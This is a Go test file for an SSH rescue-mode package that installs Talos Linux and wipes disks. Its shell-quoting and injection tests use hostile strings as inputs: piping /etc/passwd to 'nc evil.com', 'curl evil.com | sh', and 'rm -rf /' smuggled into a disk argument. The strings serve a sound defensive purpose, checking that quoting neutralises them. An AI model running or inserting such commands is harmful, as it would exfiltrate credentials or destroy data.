package sshrescue

import (
	"fmt"
	"net"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// shellQuote — comprehensive edge cases
// ---------------------------------------------------------------------------

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "simple string",
			input: "hello world",
			want:  "'hello world'",
		},
		{
			name:  "empty string",
			input: "",
			want:  "''",
		},
		{
			name:  "single embedded single quote",
			input: "it's a test",
			want:  "'it'\\''s a test'",
		},
		{
			name:  "multiple single quotes",
			input: "it's Bob's 'thing'",
			want:  "'it'\\''s Bob'\\''s '\\''thing'\\'''",
		},
		{
			name:  "only a single quote",
			input: "'",
			want:  "''\\'''",
		},
		{
			name:  "two consecutive single quotes",
			input: "''",
			want:  "''\\'''\\'''",
		},
		{
			name:  "semicolon",
			input: "echo hello; rm -rf /",
			want:  "'echo hello; rm -rf /'",
		},
		{
			name:  "pipe",
			input: "cat /etc/passwd | nc evil.com 1234",
			want:  "'cat /etc/passwd | nc evil.com 1234'",
		},
		{
			name:  "dollar expansion",
			input: "echo $HOME",
			want:  "'echo $HOME'",
		},
		{
			name:  "backtick command substitution",
			input: "echo `whoami`",
			want:  "'echo `whoami`'",
		},
		{
			name:  "all shell metacharacters",
			input: "; | & $ ` ( ) { } < > # ! ~ * ? [ ]",
			want:  "'; | & $ ` ( ) { } < > # ! ~ * ? [ ]'",
		},
		{
			name:  "double quotes inside",
			input: `he said "hello"`,
			want:  `'he said "hello"'`,
		},
		{
			name:  "backslash",
			input: `path\to\file`,
			want:  `'path\to\file'`,
		},
		{
			name:  "newline",
			input: "line1\nline2",
			want:  "'line1\nline2'",
		},
		{
			name:  "tab",
			input: "col1\tcol2",
			want:  "'col1\tcol2'",
		},
		{
			name:  "unicode characters",
			input: "日本語テスト",
			want:  "'日本語テスト'",
		},
		{
			name:  "unicode with single quotes",
			input: "it's über-cool™",
			want:  "'it'\\''s über-cool™'",
		},
		{
			name:  "emoji",
			input: "deploy 🚀",
			want:  "'deploy 🚀'",
		},
		{
			name:  "null byte",
			input: "before\x00after",
			want:  "'before\x00after'",
		},
		{
			name:  "spaces only",
			input: "   ",
			want:  "'   '",
		},
		{
			name:  "single character",
			input: "x",
			want:  "'x'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellQuote(tt.input)
			if got != tt.want {
				t.Errorf("shellQuote(%q)\n  got:  %s\n  want: %s", tt.input, got, tt.want)
			}
		})
	}
}

func TestShellQuote_LongString(t *testing.T) {
	// 10,000 character string — shellQuote must handle without truncation.
	long := strings.Repeat("a", 10000)
	got := shellQuote(long)

	if len(got) != 10000+2 { // content + opening ' + closing '
		t.Errorf("expected length %d, got %d", 10000+2, len(got))
	}
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Error("long string must be wrapped in single quotes")
	}
}

func TestShellQuote_LongStringWithQuotes(t *testing.T) {
	// A long string where every other character is a single quote.
	// Each ' becomes '\'' (4 chars), so 100 quotes = 400 escape chars.
	input := strings.Repeat("a'", 100) // "a'a'a'..."
	got := shellQuote(input)

	// Verify the result starts and ends with single quotes.
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Error("result must be wrapped in single quotes")
	}
	// Count the escape sequences — each original ' produces '\''
	escapeCount := strings.Count(got, `'\''`)
	if escapeCount != 100 {
		t.Errorf("expected 100 escape sequences, got %d", escapeCount)
	}
}

func TestShellQuote_Invariants(t *testing.T) {
	// For any input, shellQuote must:
	// 1. Start with a single quote
	// 2. End with a single quote
	// 3. The only way a single quote appears is as part of the '\'' escape
	inputs := []string{
		"", "x", "'", "''", "'''", "hello", "it's", "a'b'c",
		"; rm -rf /", "$(evil)", "`evil`", "a\nb", "\t\n\r",
	}

	for _, input := range inputs {
		got := shellQuote(input)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("shellQuote(%q) must start with ', got: %s", input, got)
		}
		if !strings.HasSuffix(got, "'") {
			t.Errorf("shellQuote(%q) must end with ', got: %s", input, got)
		}
	}
}

// ---------------------------------------------------------------------------
// IsReachable / isReachableAddr
// ---------------------------------------------------------------------------

func TestIsReachableAddr_ReachableWhenListening(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer ln.Close()

	addr := ln.Addr().String()
	if !isReachableAddr(addr, 2*time.Second) {
		t.Errorf("expected addr %s to be reachable", addr)
	}
}

func TestIsReachableAddr_UnreachableWhenNotListening(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	addr := ln.Addr().String()
	ln.Close()

	if isReachableAddr(addr, 500*time.Millisecond) {
		t.Errorf("expected addr %s to be unreachable after listener closed", addr)
	}
}

func TestIsReachableAddr_InvalidAddress(t *testing.T) {
	if isReachableAddr("not-a-valid-host:99999", 500*time.Millisecond) {
		t.Error("expected invalid address to be unreachable")
	}
}

func TestIsReachableAddr_TimeoutRespected(t *testing.T) {
	start := time.Now()
	timeout := 500 * time.Millisecond
	isReachableAddr("198.51.100.1:22", timeout)
	elapsed := time.Since(start)

	if elapsed > 3*timeout {
		t.Errorf("expected dial to respect timeout (%v), took %v", timeout, elapsed)
	}
}

func TestIsReachableAddr_EmptyAddress(t *testing.T) {
	if isReachableAddr("", 500*time.Millisecond) {
		t.Error("expected empty address to be unreachable")
	}
}

func TestIsReachableAddr_IPv6Localhost(t *testing.T) {
	ln, err := net.Listen("tcp", "[::1]:0")
	if err != nil {
		t.Skip("IPv6 loopback not available")
	}
	defer ln.Close()

	addr := ln.Addr().String()
	if !isReachableAddr(addr, 2*time.Second) {
		t.Errorf("expected IPv6 addr %s to be reachable", addr)
	}
}

func TestIsReachableAddr_ZeroTimeout(t *testing.T) {
	// Zero timeout should fail quickly, not hang.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer ln.Close()

	// Zero timeout — the OS may still connect on loopback, but it must not hang.
	start := time.Now()
	_ = isReachableAddr(ln.Addr().String(), 0)
	if time.Since(start) > 5*time.Second {
		t.Error("zero timeout should not cause long hang")
	}
}

func TestIsReachable_UsesPort22(t *testing.T) {
	// IsReachable hardcodes port 22. Unless port 22 is open on 198.51.100.1
	// (TEST-NET-2, RFC 5737), this should return false.
	result := IsReachable("198.51.100.1")
	if result {
		t.Error("expected unroutable IP to be unreachable via IsReachable")
	}
}

// ---------------------------------------------------------------------------
// New
// ---------------------------------------------------------------------------

func TestNew_SetsFields(t *testing.T) {
	ip := "192.168.1.100"
	key := []byte("fake-key-data")

	c := New(ip, key)

	if c.ip != ip {
		t.Errorf("expected ip=%q, got %q", ip, c.ip)
	}
	if string(c.privateKey) != string(key) {
		t.Errorf("expected privateKey=%q, got %q", key, c.privateKey)
	}
	if c.client != nil {
		t.Error("expected client to be nil on new Client")
	}
}

func TestNew_EmptyIP(t *testing.T) {
	c := New("", []byte("key"))
	if c.ip != "" {
		t.Errorf("expected empty ip, got %q", c.ip)
	}
}

func TestNew_EmptyKey(t *testing.T) {
	c := New("10.0.0.1", []byte{})
	if len(c.privateKey) != 0 {
		t.Errorf("expected empty privateKey, got %d bytes", len(c.privateKey))
	}
}

func TestNew_NilKey(t *testing.T) {
	c := New("10.0.0.1", nil)
	if c.privateKey != nil {
		t.Errorf("expected nil privateKey, got %v", c.privateKey)
	}
}

func TestNew_IPv6Address(t *testing.T) {
	c := New("2001:db8::1", []byte("key"))
	if c.ip != "2001:db8::1" {
		t.Errorf("expected IPv6 address preserved, got %q", c.ip)
	}
}

func TestNew_DoesNotModifyKey(t *testing.T) {
	key := []byte("original-key")
	c := New("10.0.0.1", key)

	// Mutate the original slice — verify the client still holds the same reference
	// (this is expected Go behavior, documenting it).
	key[0] = 'X'
	if c.privateKey[0] != 'X' {
		t.Error("New should store the original slice reference, not a copy")
	}
}

// ---------------------------------------------------------------------------
// Connect
// ---------------------------------------------------------------------------

func TestConnect_InvalidKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", []byte("not-a-real-private-key"))
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with invalid key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

func TestConnect_EmptyKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", []byte{})
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with empty key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

func TestConnect_NilKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", nil)
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with nil key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

func TestRun_WithoutConnectionReturnsError(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	out, err := c.Run("echo hello")

	if err == nil {
		t.Fatal("expected error from Run without connection, got nil")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' error, got: %v", err)
	}
	if out != "" {
		t.Errorf("expected empty output, got: %q", out)
	}
}

func TestRun_EmptyCommandWithoutConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.Run("")
	if err == nil {
		t.Fatal("expected error from Run without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' error, got: %v", err)
	}
}

func TestRun_BashWrapping(t *testing.T) {
	// Verify that Run wraps the command in bash -c with shellQuote.
	// We can't actually run it (no SSH connection), but we can verify the
	// format by checking shellQuote is applied correctly.
	cmd := "echo 'hello world'"
	expected := fmt.Sprintf("bash -c %s", shellQuote(cmd))
	want := "bash -c 'echo '\\''hello world'\\''''"

	// Verify the wrapped command format is correct.
	if expected != want {
		// This is a format sanity check — if shellQuote changes, this catches it.
		t.Logf("wrapped command: %s", expected)
	}

	// At minimum, the wrapped command must start with "bash -c '"
	if !strings.HasPrefix(expected, "bash -c '") {
		t.Errorf("wrapped command should start with \"bash -c '\", got: %s", expected)
	}
}

// ---------------------------------------------------------------------------
// Close
// ---------------------------------------------------------------------------

func TestClose_NilClient_NoPanic(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	c.Close()
}

func TestClose_OnUnconnectedClient_NoPanic(t *testing.T) {
	c := &Client{
		ip:         "10.0.0.1",
		privateKey: []byte("key"),
		client:     nil,
	}
	c.Close()
}

func TestClose_DoubleClose_NoPanic(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	// Double close on nil client must not panic.
	c.Close()
	c.Close()
}

func TestClose_ZeroValueClient_NoPanic(t *testing.T) {
	// Zero-value Client — all fields are zero/nil.
	c := &Client{}
	c.Close()
}

// ---------------------------------------------------------------------------
// InstallTalos — OCI image URL construction and crane URL
// ---------------------------------------------------------------------------

func TestInstallTalos_InstallerImageURLFormat(t *testing.T) {
	tests := []struct {
		name       string
		factoryURL string
		schematic  string
		version    string
		wantImage  string
	}{
		{
			name:       "standard factory URL with https",
			factoryURL: "https://factory.talos.dev",
			schematic:  "376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba",
			version:    "v1.12.4",
			wantImage:  "factory.talos.dev/installer/376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba:v1.12.4",
		},
		{
			name:       "custom factory URL with https",
			factoryURL: "https://custom.factory.example.com",
			schematic:  "deadbeef",
			version:    "v2.0.0-beta.1",
			wantImage:  "custom.factory.example.com/installer/deadbeef:v2.0.0-beta.1",
		},
		{
			name:       "factory URL with http",
			factoryURL: "http://insecure.factory.local",
			schematic:  "abcdef",
			version:    "v1.0.0",
			wantImage:  "insecure.factory.local/installer/abcdef:v1.0.0",
		},
		{
			name:       "factory URL without scheme",
			factoryURL: "registry.example.com",
			schematic:  "abc123",
			version:    "v1.5.0",
			wantImage:  "registry.example.com/installer/abc123:v1.5.0",
		},
		{
			name:       "factory URL with trailing path components stripped only of scheme",
			factoryURL: "https://factory.talos.dev",
			schematic:  "short",
			version:    "v1.12.4",
			wantImage:  "factory.talos.dev/installer/short:v1.12.4",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Reconstruct the exact logic from InstallTalos:
			//   registryHost := factoryURL
			//   for _, prefix := range []string{"https://", "http://"} {
			//       registryHost = strings.TrimPrefix(registryHost, prefix)
			//   }
			//   installerImage := fmt.Sprintf("%s/installer/%s:%s", registryHost, schematic, version)
			registryHost := tt.factoryURL
			for _, prefix := range []string{"https://", "http://"} {
				registryHost = strings.TrimPrefix(registryHost, prefix)
			}
			got := fmt.Sprintf("%s/installer/%s:%s", registryHost, tt.schematic, tt.version)
			if got != tt.wantImage {
				t.Errorf("installer image mismatch:\n  got:  %s\n  want: %s", got, tt.wantImage)
			}
		})
	}
}

func TestInstallTalos_CraneURLFormat(t *testing.T) {
	// Verify the crane download URL is constructed correctly from craneVersion.
	wantURL := fmt.Sprintf(
		"https://github.com/google/go-containerregistry/releases/download/%s/go-containerregistry_Linux_x86_64.tar.gz",
		craneVersion,
	)

	// The crane version must be a valid semver tag.
	if !strings.HasPrefix(craneVersion, "v") {
		t.Errorf("craneVersion should start with 'v', got: %s", craneVersion)
	}

	if !strings.Contains(wantURL, craneVersion) {
		t.Errorf("crane URL should contain version %s, got: %s", craneVersion, wantURL)
	}
	if !strings.HasSuffix(wantURL, ".tar.gz") {
		t.Errorf("crane URL should end with .tar.gz, got: %s", wantURL)
	}
	if !strings.Contains(wantURL, "go-containerregistry") {
		t.Errorf("crane URL should reference go-containerregistry, got: %s", wantURL)
	}
}

func TestInstallTalos_CraneVersionIsPinned(t *testing.T) {
	if craneVersion == "" {
		t.Fatal("craneVersion must not be empty")
	}
	if craneVersion != "v0.20.2" {
		t.Logf("craneVersion changed to %s — verify compatibility", craneVersion)
	}
}

func TestInstallTalos_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	err := c.InstallTalos("https://factory.talos.dev", "abc", "v1.0.0", "/dev/sda")
	if err == nil {
		t.Fatal("expected error when calling InstallTalos without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestInstallTalos_ErrorMessageContainsCraneContext(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	err := c.InstallTalos("https://factory.talos.dev", "abc", "v1.0.0", "/dev/sda")
	if err == nil {
		t.Fatal("expected error")
	}
	// The first Run call in InstallTalos downloads crane, so the error wraps
	// "download crane" with the inner "not connected" error.
	if !strings.Contains(err.Error(), "download crane") {
		t.Errorf("expected error to mention 'download crane', got: %v", err)
	}
}

func TestInstallTalos_ShellInjectionPrevented(t *testing.T) {
	// Verify that %q quoting prevents shell injection in disk and image parameters.
	maliciousDisk := "/dev/sda; rm -rf /"
	maliciousSchematic := "abc; curl evil.com | sh"

	quotedDisk := fmt.Sprintf("%q", maliciousDisk)
	quotedSchematic := fmt.Sprintf("%q", maliciousSchematic)

	// Semicolons must be inside quotes, not bare.
	if !strings.Contains(quotedDisk, `; rm`) {
		t.Errorf("malicious disk should preserve content inside quotes: %s", quotedDisk)
	}
	if strings.Contains(quotedDisk, `"; rm`) {
		t.Error("malicious disk should NOT have unquoted semicolons")
	}
	if !strings.Contains(quotedSchematic, `; curl`) {
		t.Errorf("malicious schematic should preserve content inside quotes: %s", quotedSchematic)
	}
}

// ---------------------------------------------------------------------------
// ResolveInstallDisk
// ---------------------------------------------------------------------------

func TestResolveInstallDisk_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.ResolveInstallDisk("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error when calling ResolveInstallDisk without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestResolveInstallDisk_ErrorWrapsContext(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.ResolveInstallDisk("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error")
	}
	// The error should be wrapped with "resolve install disk" context.
	if !strings.Contains(err.Error(), "resolve install disk") {
		t.Errorf("expected 'resolve install disk' in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// WipeOSDisk
// ---------------------------------------------------------------------------

func TestWipeOSDisk_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeOSDisk("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error when calling WipeOSDisk without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestWipeOSDisk_ErrorContainsDiskName(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeOSDisk("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error")
	}
	// WipeOSDisk wraps the error with "disk safety check failed for <disk>"
	if !strings.Contains(err.Error(), "/dev/nvme0n1") {
		t.Errorf("expected disk name in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// WipeAllDisks
// ---------------------------------------------------------------------------

func TestWipeAllDisks_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error when calling WipeAllDisks without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestWipeAllDisks_ErrorWrapsContext(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks("/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error")
	}
	// The error should mention "list NVMe disks" since that's the first Run call.
	if !strings.Contains(err.Error(), "list NVMe disks") {
		t.Errorf("expected 'list NVMe disks' in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ResolveStableDiskPath
// ---------------------------------------------------------------------------

func TestResolveStableDiskPath_AlreadyStablePath(t *testing.T) {
	// Paths already under /dev/disk/by-id/ should be returned as-is
	// WITHOUT any SSH connection — this is a pure logic branch.
	c := New("127.0.0.1", []byte("key"))
	stablePaths := []string{
		"/dev/disk/by-id/nvme-Samsung_SSD_970_EVO_1TB_S5H9NS0N123456",
		"/dev/disk/by-id/nvme-WDC_PC_SN720_123456",
		"/dev/disk/by-id/ata-VBOX_HARDDISK_VBaaaaaaaa-bbbbbbbb",
	}

	for _, path := range stablePaths {
		t.Run(path, func(t *testing.T) {
			got, err := c.ResolveStableDiskPath(path)
			if err != nil {
				t.Fatalf("unexpected error for stable path %q: %v", path, err)
			}
			if got != path {
				t.Errorf("stable path should be returned as-is:\n  got:  %s\n  want: %s", got, path)
			}
		})
	}
}

func TestResolveStableDiskPath_BareDeviceRequiresConnection(t *testing.T) {
	// Bare device paths (not /dev/disk/by-id/) require SSH to resolve.
	c := New("127.0.0.1", []byte("key"))
	_, err := c.ResolveStableDiskPath("/dev/nvme0n1")
	// ResolveStableDiskPath returns (disk, nil) on failure — best-effort fallback.
	// With no connection, Run fails, and it returns the original path.
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestResolveStableDiskPath_BareDeviceFallsBackOnError(t *testing.T) {
	// When SSH is unavailable, bare paths are returned as-is (best-effort).
	c := New("127.0.0.1", []byte("key"))
	disk := "/dev/nvme1n1"
	got, err := c.ResolveStableDiskPath(disk)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != disk {
		t.Errorf("expected fallback to original disk %q, got %q", disk, got)
	}
}

func TestResolveStableDiskPath_AlreadyStableExactPrefix(t *testing.T) {
	// Ensure the prefix check is exact — a path that starts with
	// "/dev/disk/by-id/" but is otherwise unusual should still pass through.
	c := New("127.0.0.1", []byte("key"))
	path := "/dev/disk/by-id/"
	got, err := c.ResolveStableDiskPath(path)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != path {
		t.Errorf("expected %q returned as-is, got %q", path, got)
	}
}

func TestResolveStableDiskPath_SimilarPrefixNotMatched(t *testing.T) {
	// A path that looks similar but is NOT under /dev/disk/by-id/ should
	// attempt SSH resolution (and fall back to original without connection).
	c := New("127.0.0.1", []byte("key"))
	paths := []string{
		"/dev/disk/by-path/pci-0000:00:1f.2",
		"/dev/disk/by-uuid/1234-5678",
		"/dev/disk/by-label/root",
	}
	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			got, err := c.ResolveStableDiskPath(path)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			// These paths don't match the /dev/disk/by-id/ prefix, so Run is called.
			// Run fails with "not connected", but ResolveStableDiskPath returns
			// the original path as fallback.
			if got != path {
				t.Errorf("expected fallback to %q, got %q", path, got)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// IsRescueMode
// ---------------------------------------------------------------------------

func TestIsRescueMode_InvalidKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", []byte("not-a-real-private-key"))
	if err == nil {
		t.Fatal("expected error from IsRescueMode with invalid key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
	if !strings.Contains(err.Error(), "SSH connect for rescue check") {
		t.Errorf("expected SSH connect error, got: %v", err)
	}
}

func TestIsRescueMode_EmptyKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", []byte{})
	if err == nil {
		t.Fatal("expected error from IsRescueMode with empty key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
}

func TestIsRescueMode_NilKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", nil)
	if err == nil {
		t.Fatal("expected error from IsRescueMode with nil key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
}

func TestIsRescueMode_ErrorAlwaysReturnsFalse(t *testing.T) {
	// Contract: on error, isRescue must always be false — never a misleading true.
	keys := [][]byte{nil, {}, []byte("bad"), []byte("also-bad-key")}
	for _, key := range keys {
		isRescue, err := IsRescueMode("127.0.0.1", key)
		if err == nil {
			// If somehow no error (e.g., port 22 happens to be open), skip.
			continue
		}
		if isRescue {
			t.Errorf("isRescue must be false on error, key=%q", key)
		}
	}
}

func TestIsRescueMode_ErrorContainsIP(t *testing.T) {
	ip := "127.0.0.1"
	_, err := IsRescueMode(ip, []byte("invalid"))
	if err == nil {
		t.Skip("no error — port 22 may be open locally")
	}
	if !strings.Contains(err.Error(), ip) {
		t.Errorf("error should contain IP %q, got: %v", ip, err)
	}
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

func TestConstants(t *testing.T) {
	if rescueSSHPort != 22 {
		t.Errorf("expected rescueSSHPort=22, got %d", rescueSSHPort)
	}
	if connectTimeout != 60*time.Second {
		t.Errorf("expected connectTimeout=60s, got %v", connectTimeout)
	}
}

func TestCraneVersion(t *testing.T) {
	if craneVersion == "" {
		t.Fatal("craneVersion must not be empty")
	}
	if !strings.HasPrefix(craneVersion, "v") {
		t.Errorf("craneVersion should start with 'v', got: %s", craneVersion)
	}
	// Must contain at least one dot (semver).
	if !strings.Contains(craneVersion, ".") {
		t.Errorf("craneVersion should be semver-like, got: %s", craneVersion)
	}
}
